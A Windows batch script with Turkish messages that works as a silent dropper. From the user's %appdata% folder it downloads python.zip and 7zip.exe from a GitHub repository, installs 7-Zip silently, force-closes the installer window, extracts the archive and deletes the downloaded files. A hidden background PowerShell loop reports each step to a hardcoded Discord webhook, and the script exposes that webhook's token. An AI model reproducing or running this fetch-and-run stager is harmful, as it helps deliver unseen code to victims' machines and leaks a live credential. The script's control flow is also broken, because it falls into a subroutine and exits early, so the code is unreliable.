@echo off
setlocal EnableDelayedExpansion

REM Set webhook URL
set WEBHOOK_URL=https://discord.com/api/webhooks/1246739900783399022/YJ0TZ3sqjSaR71iVNAhDIdw1W7Fi6g_hI0MyrrQSOEaP7ZQ0CTxayfFbmYwZqQMH-E7q

REM Create a temporary file for our webhook queue
set "QUEUE_FILE=%TEMP%\webhook_queue.txt"
if exist "%QUEUE_FILE%" del "%QUEUE_FILE%"
type nul > "%QUEUE_FILE%"

REM Function to add message to queue
:addToQueue
echo %~1 >> "%QUEUE_FILE%"
exit /b

REM Begin processing
call :addToQueue "Script başlatıldı"

REM Navigate to %appdata% directory
cd /d "%appdata%"
call :addToQueue "%%appdata%% dizinine geçildi: %appdata%"

REM Create webhook processor in background
start /b powershell -Command ^
"$queueFile = '%QUEUE_FILE%'; $webhookUrl = '%WEBHOOK_URL%'; ^
 while($true) { ^
    if(Test-Path $queueFile) { ^
        $messages = Get-Content $queueFile -ErrorAction SilentlyContinue; ^
        if($messages) { ^
            $message = $messages[0]; ^
            $newContent = $messages[1..$messages.Length]; ^
            if($newContent) { Set-Content $queueFile $newContent } else { Clear-Content $queueFile }; ^
            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body ('{\"content\":\"' + $message + '\"}'); ^
            Write-Host \"Sent: $message\"; ^
            Start-Sleep -Seconds 2; ^
        } else { Start-Sleep -Milliseconds 500 } ^
    } else { Start-Sleep -Milliseconds 500 } ^
 }"

REM Give the webhook processor a moment to start
ping 127.0.0.1 -n 2 > nul

REM Download Python.zip
call :addToQueue "Python.zip indiriliyor..."
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/nizhenets/monitor/raw/main/python.zip' -OutFile 'Python.zip'"
call :addToQueue "Python.zip indirildi"

REM Download 7zip.exe
call :addToQueue "7zip.exe indiriliyor..."
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/nizhenets/monitor/raw/main/7zip.exe' -OutFile '7zip.exe'"
call :addToQueue "7zip.exe indirildi"

REM Wait 1 second
ping 127.0.0.1 -n 2 > nul
call :addToQueue "7zip kurulumu başlatılıyor..."

REM Install 7zip silently (assuming it supports silent installation)
start /wait 7zip.exe /S
call :addToQueue "7zip kurulumu tamamlandı"

REM Wait 1 second
ping 127.0.0.1 -n 2 > nul

REM Close any potential 7zip installation windows
taskkill /f /im 7zipInstaller.exe 2>nul
call :addToQueue "7zip kurulum ekranı kapatıldı"

REM Wait 1 second
ping 127.0.0.1 -n 2 > nul

REM Delete 7zip installer
del /f /q 7zip.exe
call :addToQueue "7zip.exe silindi"

REM Create directory for extraction if it doesn't exist
if not exist python_files mkdir python_files
call :addToQueue "Python dosyalarını çıkartılacak klasör oluşturuldu"

REM Extract Python.zip using 7zip
call :addToQueue "Python.zip çıkartılıyor..."
powershell -Command "& 'C:\\Program Files\\7-Zip\\7z.exe' x Python.zip -oPython_files -y"
call :addToQueue "Python.zip çıkartma işlemi tamamlandı"

REM Delete the zip file after extraction
del /f /q Python.zip
call :addToQueue "Python.zip silindi"

call :addToQueue "Tüm işlemler başarıyla tamamlandı"

REM Wait for the queue to be processed
:waitForQueue
ping 127.0.0.1 -n 2 > nul
for /f %%i in ("%QUEUE_FILE%") do set size=%%~zi
if %size% GTR 0 goto waitForQueue

REM Clean up
del "%QUEUE_FILE%"
echo İşlem tamamlandı.
exit /b